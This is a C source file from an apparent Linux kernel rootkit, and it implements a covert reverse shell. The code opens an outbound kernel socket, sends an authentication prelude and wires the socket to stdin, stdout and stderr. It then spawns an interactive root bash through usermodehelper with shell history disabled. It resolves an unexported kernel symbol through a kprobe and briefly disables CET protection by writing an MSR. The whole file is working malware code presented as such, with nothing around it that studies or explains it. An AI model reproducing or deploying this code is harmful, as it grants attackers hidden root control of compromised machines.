// SPDX-License-Identifier: GPL-2.0
// execution/shell.c - Ticket-based reverse shell via usermodehelper.
#include <asm/msr.h>
#include <linux/err.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fs_struct.h>
#include <linux/kprobes.h>
#include <linux/mutex.h>
#include <linux/namei.h>
#include <linux/net.h>
#include <linux/string.h>
#include <linux/umh.h>
#include <linux/workqueue.h>

#include "rootkit.h"

static void (*rk_set_fs_pwd)(struct fs_struct *, const struct path *);

enum rk_shell_state {
	RK_SHELL_IDLE,
	RK_SHELL_CONNECTING,
	RK_SHELL_RUNNING,
	RK_SHELL_EXITED,
	RK_SHELL_REFUSED,
	RK_SHELL_TIMED_OUT,
	RK_SHELL_FAILED,
	RK_SHELL_STOPPED,
};

struct rk_shell {
	struct mutex lock;
	bool busy;
	enum rk_shell_state state;
	int result;
	u32 request_id;
	u64 cookie;
	unsigned short port;
	struct socket *sock;
	struct file *file;
	struct delayed_work timeout_work;
	unsigned long timeout_jiffies;
};

static struct rk_shell interactive_shell;
static struct rk_shell exec_shell;

static char *shell_argv[] = {
    "setsid",	 "/bin/script", "-q", "-c", "/bin/bash --noprofile --norc -i",
    "/dev/null", NULL,
};

static char *shell_envp[] = {
    "HOME=/",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
    "TERM=xterm-256color",
    "HISTFILE=/dev/null",
    NULL,
};

static const char *state_names[] = {
    [RK_SHELL_IDLE] = "idle",	    [RK_SHELL_CONNECTING] = "connecting",
    [RK_SHELL_RUNNING] = "running", [RK_SHELL_EXITED] = "exited",
    [RK_SHELL_REFUSED] = "refused", [RK_SHELL_TIMED_OUT] = "timed-out",
    [RK_SHELL_FAILED] = "failed",   [RK_SHELL_STOPPED] = "stopped",
};

static void rk_shell_timeout_fn(struct work_struct *work)
{
	struct rk_shell *shell =
	    container_of(to_delayed_work(work), struct rk_shell, timeout_work);

	mutex_lock(&shell->lock);
	if (shell->busy && shell->sock) {
		shell->state = RK_SHELL_TIMED_OUT;
		shell->result = -ETIMEDOUT;
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	}
	mutex_unlock(&shell->lock);
}

static void rk_shell_init_one(struct rk_shell *shell)
{
	mutex_init(&shell->lock);
	shell->busy = false;
	shell->state = RK_SHELL_IDLE;
	shell->result = 0;
	shell->request_id = 0;
	shell->cookie = 0;
	shell->port = 0;
	shell->sock = NULL;
	shell->file = NULL;
	shell->timeout_jiffies = msecs_to_jiffies(shell_timeout_ms);
	INIT_DELAYED_WORK(&shell->timeout_work, rk_shell_timeout_fn);
}

static int rk_install_fd(struct file *file, unsigned int wanted)
{
	int fd;

	fd = get_unused_fd_flags(0);
	if (fd < 0)
		return fd;
	if ((unsigned int)fd != wanted) {
		put_unused_fd(fd);
		return -EBUSY;
	}
	get_file(file);
	fd_install(fd, file);
	return 0;
}

static int rk_shell_init_fn(struct subprocess_info *info, struct cred *new)
{
	struct rk_shell *shell = info->data;
	unsigned int fd;
	int error;

	(void)new;
	if (!shell->file)
		return -ECANCELED;
	for (fd = 0; fd < 3; fd++) {
		error = rk_install_fd(shell->file, fd);
		if (error)
			return error;
	}
	if (rk_set_fs_pwd) {
		struct path root;

		if (kern_path("/", LOOKUP_DIRECTORY, &root) == 0) {
			u64 msr;

			rdmsrq(MSR_IA32_S_CET, msr);
			wrmsrq(MSR_IA32_S_CET, msr & ~CET_ENDBR_EN);
			rk_set_fs_pwd(current->fs, &root);
			wrmsrq(MSR_IA32_S_CET, msr);
			path_put(&root);
		}
	}
	return 0;
}

static int rk_shell_make_file(struct rk_shell *shell)
{
	struct file *file;

	file = sock_alloc_file(shell->sock, 0, NULL);
	if (IS_ERR(file))
		return PTR_ERR(file);

	shell->file = file;
	return 0;
}

static void rk_shell_release(struct rk_shell *shell)
{
	cancel_delayed_work_sync(&shell->timeout_work);

	if (shell->file) {
		fput(shell->file);
		shell->file = NULL;
		shell->sock = NULL;
	} else if (shell->sock) {
		sock_release(shell->sock);
		shell->sock = NULL;
	}
}

static int rk_send_prelude(struct socket *sock, u32 request_id, u64 cookie)
{
	char prelude[32];
	struct msghdr msg = {0};
	struct kvec vec;

	snprintf(prelude, sizeof(prelude), "RKSH %08x %016llx\n", request_id,
		 (unsigned long long)cookie);
	vec.iov_base = prelude;
	vec.iov_len = 31;
	return kernel_sendmsg(sock, &msg, &vec, 1, 31);
}

static int rk_shell_spawn(struct rk_shell *shell, char **argv)
{
	struct subprocess_info *sub;
	struct socket *sock;
	int ret;

	shell->state = RK_SHELL_CONNECTING;

	sock = rk_connect_port(shell->port);
	if (IS_ERR(sock)) {
		shell->state = RK_SHELL_REFUSED;
		shell->result = PTR_ERR(sock);
		return shell->result;
	}
	shell->sock = sock;

	ret = rk_send_prelude(sock, shell->request_id, shell->cookie);
	if (ret < 0) {
		shell->state = RK_SHELL_FAILED;
		shell->result = ret;
		return ret;
	}

	if (rk_shell_make_file(shell)) {
		shell->state = RK_SHELL_FAILED;
		shell->result = -EIO;
		return -EIO;
	}

	shell->state = RK_SHELL_RUNNING;
	shell->result = -EINPROGRESS;

	mod_delayed_work(system_wq, &shell->timeout_work,
			 shell->timeout_jiffies);

	sub = call_usermodehelper_setup("/bin/setsid", argv, shell_envp,
					GFP_KERNEL, rk_shell_init_fn, NULL,
					shell);
	if (!sub) {
		shell->state = RK_SHELL_FAILED;
		shell->result = -ENOMEM;
		return -ENOMEM;
	}

	ret = call_usermodehelper_exec(sub, UMH_WAIT_PROC);
	if (shell->state == RK_SHELL_RUNNING) {
		shell->state = RK_SHELL_EXITED;
		shell->result = ret;
	}
	return 0;
}

static void rk_interactive_work(struct work_struct *work)
{
	struct rk_shell *shell = &interactive_shell;

	rk_shell_spawn(shell, shell_argv);

	rk_shell_release(shell);
	mutex_lock(&shell->lock);
	shell->busy = false;
	mutex_unlock(&shell->lock);
}

static void rk_exec_work(struct work_struct *work)
{
	struct rk_shell *shell = &exec_shell;

	rk_shell_spawn(shell, shell_argv);

	rk_shell_release(shell);
	mutex_lock(&shell->lock);
	shell->busy = false;
	mutex_unlock(&shell->lock);
}

static DECLARE_WORK(interactive_work_item, rk_interactive_work);
static DECLARE_WORK(exec_work_item, rk_exec_work);

static void rk_shell_stop(struct rk_shell *shell)
{
	mutex_lock(&shell->lock);
	if (shell->sock) {
		shell->state = RK_SHELL_STOPPED;
		kernel_sock_shutdown(shell->sock, SHUT_RDWR);
	}
	mutex_unlock(&shell->lock);
	cancel_delayed_work_sync(&shell->timeout_work);
}

static void rk_resolve_set_fs_pwd(void)
{
	struct kprobe kp = {.symbol_name = "set_fs_pwd"};

	if (register_kprobe(&kp) == 0) {
		rk_set_fs_pwd = (typeof(rk_set_fs_pwd))kp.addr;
		unregister_kprobe(&kp);
	}
}

void rk_shells_init(void)
{
	rk_resolve_set_fs_pwd();
	rk_shell_init_one(&interactive_shell);
	rk_shell_init_one(&exec_shell);
}

void rk_shells_cleanup(void)
{
	rk_shell_stop(&interactive_shell);
	rk_shell_stop(&exec_shell);
	cancel_work_sync(&interactive_work_item);
	cancel_work_sync(&exec_work_item);
}

int rk_start_shell(unsigned short port, u32 request_id, u64 cookie)
{
	int error = 0;

	mutex_lock(&interactive_shell.lock);
	if (interactive_shell.busy) {
		error = -EBUSY;
	} else {
		interactive_shell.busy = true;
		interactive_shell.port = port;
		interactive_shell.request_id = request_id;
		interactive_shell.cookie = cookie;
		interactive_shell.state = RK_SHELL_CONNECTING;
		interactive_shell.result = 0;
		schedule_work(&interactive_work_item);
	}
	mutex_unlock(&interactive_shell.lock);
	return error;
}

int rk_start_exec_shell(unsigned short port, u32 request_id, u64 cookie)
{
	int error = 0;

	mutex_lock(&exec_shell.lock);
	if (exec_shell.busy) {
		error = -EBUSY;
	} else {
		exec_shell.busy = true;
		exec_shell.port = port;
		exec_shell.request_id = request_id;
		exec_shell.cookie = cookie;
		exec_shell.state = RK_SHELL_CONNECTING;
		exec_shell.result = 0;
		schedule_work(&exec_work_item);
	}
	mutex_unlock(&exec_shell.lock);
	return error;
}

void rk_shell_status(char *buf, size_t size)
{
	mutex_lock(&interactive_shell.lock);
	snprintf(buf, size, "STATE %08x %s %d", interactive_shell.request_id,
		 state_names[interactive_shell.state],
		 interactive_shell.result);
	mutex_unlock(&interactive_shell.lock);
}
